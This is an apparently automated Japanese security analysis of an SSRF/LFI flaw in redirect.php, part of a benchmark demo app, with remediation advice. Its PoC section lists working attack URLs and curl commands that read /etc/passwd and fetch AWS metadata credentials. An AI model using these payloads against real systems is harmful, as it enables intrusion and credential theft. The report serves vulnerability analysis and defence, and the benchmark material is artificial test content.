# Security Analysis: redirect.php - HTTP request parameters - combined GET, POST, and COOKIE data

## ファイル情報

- **ファイルパス**: `benchmarks/benchmarks/XBEN-020-24/ssrf-demo-app/redirect.php`
- **検出パターン**: HTTP request parameters - combined GET, POST, and COOKIE data

![高信頼度](https://img.shields.io/badge/信頼度-高-red) **信頼度スコア: 100**

## 脆弱性タイプ

- `SSRF`
- `LFI`

## PAR Policy Analysis

### Principals (データ源)

- **$_GET['url']**: Untrusted
  - Context: HTTPリクエストのGETパラメータからの直接的なユーザー入力
  - Risk Factors: 完全にユーザー制御可能, 任意のURLスキームを指定可能（http, https, file, ftp等）, 内部IPアドレスや内部ホスト名を指定可能

### Actions (セキュリティ制御)

- **なし（バリデーション欠如）**: Missing
  - Function: URLの検証とサニタイズ
  - Weaknesses: URLスキームの検証なし, ホスト名のホワイトリスト検証なし, 内部IPアドレスのブロックなし, リダイレクト追跡の制御なし
  - Bypass Vectors: file://スキームでローカルファイル読み取り, 内部IPアドレス（127.0.0.1, 192.168.x.x, 10.x.x.x等）, クラウドメタデータエンドポイント（169.254.169.254）, IPv6アドレス（::1）, DNS rebinding攻撃
- **htmlspecialchars()**: Adequate
  - Function: 出力時のHTMLエスケープ（XSS対策）
  - Weaknesses: XSS対策としては機能するが、SSRF対策にはならない
  - Bypass Vectors: 

### Resources (操作対象)

- **file_get_contents($url)**: Critical
  - Operation: ネットワークリクエスト/ファイル読み取り
  - Protection: 

### Policy Violations

#### SSRF-001: ユーザー入力を直接ネットワークリクエストに使用してはならない

- **Path**: $_GET['url'] -> (バリデーションなし) -> file_get_contents()
- **Severity**: critical
- **Confidence**: 1.00

#### LFI-001: ユーザー入力でファイルパスを制御させてはならない

- **Path**: $_GET['url'] -> (バリデーションなし) -> file_get_contents() (file://スキーム)
- **Severity**: critical
- **Confidence**: 1.00

## マッチしたソースコード

```code
htmlspecialchars($response)
```

## 詳細解析

## 脆弱性分析

### 発見された脆弱性: SSRF（Server-Side Request Forgery）

このPHPコードには**深刻なSSRF脆弱性**が存在します。

**問題点:**
1. `$_GET['url']`からユーザー提供のURLを直接受け取っている
2. **一切のバリデーションなし**で`file_get_contents()`に渡している
3. `htmlspecialchars()`は出力のXSS対策であり、SSRF対策ではない

**攻撃シナリオ:**
- **内部ネットワークアクセス**: `http://localhost/admin`、`http://192.168.1.1/`などで内部サービスにアクセス
- **ローカルファイル読み取り**: `file:///etc/passwd`でサーバーのファイルを読み取り
- **クラウドメタデータアクセス**: `http://169.254.169.254/latest/meta-data/`でAWSインスタンスの認証情報を取得
- **ポートスキャン**: 内部ネットワークのポートスキャンに悪用

**MITRE ATT&CK関連:**
- T1190: Exploit Public-Facing Application
- T1071: Application Layer Protocol

## PoC（概念実証コード）

```text
<?php
// PoC: SSRF脆弱性のデモンストレーション
// 注意: このコードは教育目的のみです。実際に悪用しないでください。

// 攻撃例1: ローカルファイル読み取り
// URL: redirect.php?url=file:///etc/passwd

// 攻撃例2: 内部ネットワークアクセス
// URL: redirect.php?url=http://localhost:80/admin
// URL: redirect.php?url=http://127.0.0.1:22

// 攻撃例3: AWSメタデータ取得（クラウド環境の場合）
// URL: redirect.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

// 攻撃例4: 内部サービスへのアクセス
// URL: redirect.php?url=http://internal-db-server:3306
// URL: redirect.php?url=http://redis-server:6379

// curlコマンドでのPoC実行例:
// curl "http://vulnerable-server/redirect.php?url=file:///etc/passwd"
// curl "http://vulnerable-server/redirect.php?url=http://169.254.169.254/latest/meta-data/"
?>
```

## 修復ガイダンス

### URLバリデーション

- **Required**: 厳格なURL検証の実装
- **Guidance**: 1. 許可するURLスキームをhttp/httpsのみに制限
2. ホスト名のホワイトリストを実装
3. 内部IPアドレス（127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16）をブロック
4. parse_url()でURLを解析し、各コンポーネントを検証
- **Priority**: critical

### file_get_contents()の代替

- **Required**: より安全なHTTPクライアントの使用
- **Guidance**: cURLを使用し、CURLOPT_PROTOCOLS で許可するプロトコルを制限（CURLPROTO_HTTP | CURLPROTO_HTTPS）、CURLOPT_FOLLOWLOCATION を無効化またはリダイレクト先も検証
- **Priority**: high

### ネットワーク分離

- **Required**: インフラレベルでの保護
- **Guidance**: Webサーバーから内部ネットワークへのアクセスをファイアウォールで制限、クラウドメタデータサービスへのアクセスをブロック
- **Priority**: high

## 解析ノート

このコードを分析します。$_GET['url']からユーザー入力を受け取り、file_get_contents()で直接そのURLにアクセスしています。これは典型的なSSRF（Server-Side Request Forgery）脆弱性です。攻撃者は内部ネットワークのリソースにアクセスしたり、ローカルファイルを読み取ったりできます。htmlspecialchars()は出力時のXSS対策であり、SSRF対策にはなりません。

